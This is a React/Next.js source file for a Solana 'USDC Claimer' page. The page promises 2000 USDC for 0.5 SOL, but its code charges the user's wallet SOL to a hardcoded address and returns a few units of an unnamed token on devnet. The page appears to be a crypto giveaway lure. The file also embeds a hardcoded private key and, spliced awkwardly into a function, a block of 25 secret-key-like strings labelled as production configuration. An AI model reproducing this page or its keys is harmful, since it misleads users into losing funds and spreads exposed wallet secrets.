/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5kDncBSco65FPxFpTjne9dz4DcbPBkQaux5J66ANKjgjmtwX137r7G9fKEvgAozdd5uh2jyK1wKAxUXaC7FQu9qs"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4igos7FgKq9WseZmYECWhSbNx24BFPmHyd7nt7nh8sVD6fWNwx47KNRdfbWYnw6wbEutFHnPBYoGWLWfGCPqZ8c3",
  "key1": "4ZyukZyqWTYdFGtDMNeRJPQdunJMngqZAikfPEz5SPuuBUR6qBmoisgXjPRaCUfeim7uzNiFyaiLiaXvdHkoWg5",
  "key2": "v4AZeYvVoqEpLMSBSPaK6LophwpXUJCEJoUawUefKNxzw4TjApRdLK82yDe8HrRdRHcA2UDnLJTYKuLMDUE9eSd",
  "key3": "y2fqdY9KkvT6Bsk1zPTbLmQMXthgu6hFQdZAE5QfKuQ4saYzURhB42FEsxktQYBkucuNFKTyYwPkbWSo6p66zUp",
  "key4": "5rgqCmy1Ayac6GXYy3ihPb2rtgwcTb2p2E337rQr3ciC2TahDLe9WPp8Arkc8DzeW8dm5pECBEYJX9WXzwg4zcbR",
  "key5": "trUrZNU7ggKsBvdUbPYP5dEsbYJTXHZeKJ8ubTUbWaWUtTfLvRiEkxGvn9gDCseu5Hwgt9rkX8r8v8cKAADVZwj",
  "key6": "5hTPak4TNV24EzMUv336JzTX3XYXzMNWFNSfS648TDiJfURcQeryXz2w68XeKxNPP26aiq9N6adMGS3YeoRphx5R",
  "key7": "YEf8ktiHDMKD288jnrxTEjDPG7237RTbacmmvULYa9jehKFrHzU6rdze19onvmE9zLfabh7UsUSi3mpgYXqMPu7",
  "key8": "4QE8yUTkjLDCbgENste75DCcyQHWFRWJ8kMQ4sYMJnZRpkmJEhFckzq6QfGZAfdCVydEuuqxrfL484PfkD22AczY",
  "key9": "2CLYddG2phXTFFqYdMrqkVZZdLFByUQwEyFaeCJEnV57LyvUgfyhJB7VCfEHqYTbtYk74Uq6fJxAEX323vAMnpee",
  "key10": "M2uNzSwxF7Eoj2RDS3QNDbsSPMPjWbm9QNqG5EP85SJ59ab3rSRqXoGz4byXojKBE8ZN87vw1d1LtM9biFD77LU",
  "key11": "4SnDer1Lz5E9W6H1jd6a4AnKJs3gjn6y7x6FL4PWUCYTnQLubXUkTs4jXiv4kC7bvtkRVCNLVecLnjDPxJ4u9fAp",
  "key12": "5FcAdL7wsVnV2XZVdfuZKGVQXLjsCCe13Q3Q6UVzYh6QZhynZUquzrwVc3nKtQWk9o1UUk9X7UKUj4KRa4VEWQEu",
  "key13": "576VexZK4FXYank4Qxgt8es2HJYUkpHb592kpSwHs1Yb4Un8s6XZB2iEajmFKc4XAiocXJDDyWdHuKZ99i3pbo1P",
  "key14": "5oe3x4w8QweiXroHqCkCBnhJraGW7ZhACmnukLsCTVpPBtV99YFT1E7BXKUf4yb8j2fptq9974ubWwNL7NJzxbmj",
  "key15": "2GautkUbvZgmoAuVRaUsv8DfLY6YUUgGxrtQZ9QkGk1dnbmWoCZggdhNvdgVkgFMxaYsuTh8xuKwiJo7pJVW27nE",
  "key16": "5HuPx2GMwrbEi5djqAtYHzDnBwnDbL7ziVbRkbAmwk8gni1epJvTVp1J7Jb2J5qtd2k2ZwANC4jY4SifuvPkXxQb",
  "key17": "3BEHNqvBvELZLYcFiAxiEnGhaV2mobT3uE1g362UmkpaUnAmZzk5oj445qVDSCBj3PbWtUW2oJGWVWWbd2NUus4E",
  "key18": "2k7TufEbXZsqYasQV6ZDpmtdP44etHD4NryfrFgg3DPNjahuUciwHtkrSwcb8ne4bo9vhysCm93iEwG7mGRes2xk",
  "key19": "KtNBYVk2knv43PEN9FMMT3fFdLLHcZtWKeRHZdx4hfjodGrLpYfxYU8NtMevVRTDYpW8yq2QqTmFxvm48C6we7m",
  "key20": "5TNmYCYSdLZjnTKYjuKJibss5PxdsGWF3MbEakiV5m7aB2BApSbMRWPon8eqJgXi4PDhFpoHGTMHk4qYzzH7Hxfq",
  "key21": "4MKSfRrATZjmUvUhmq5gmt3KQVUicbKSudbkySbk89hMRYDEPiXAcMc8uCLNc6efrSasx6qtv2zUsNPW9yYh3Mzn",
  "key22": "56L5PcLTqCeAnMStH7U3rZ7xg1q2LLUNUm4XLCznMaYnS8WDJJdHeErv7QbswiqhYaKPdFhT8cCRzwegvahkM6BE",
  "key23": "3PoXxem61s324h3LGFx3LE6r9VMD9HqYiR5XGyWvW4grhB1ZGywA8aW3ARMV2oFfGVvkaL3XYYqh6fqmKb41qiQ6",
  "key24": "XFKAPJLuUMnC1xDSt4JuF1muaAw6MGw8jGaJAnr487AGTmQtJnR5HmChszKRmJXfK8VXjw7dqDJvqgDdQLNdUhS"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
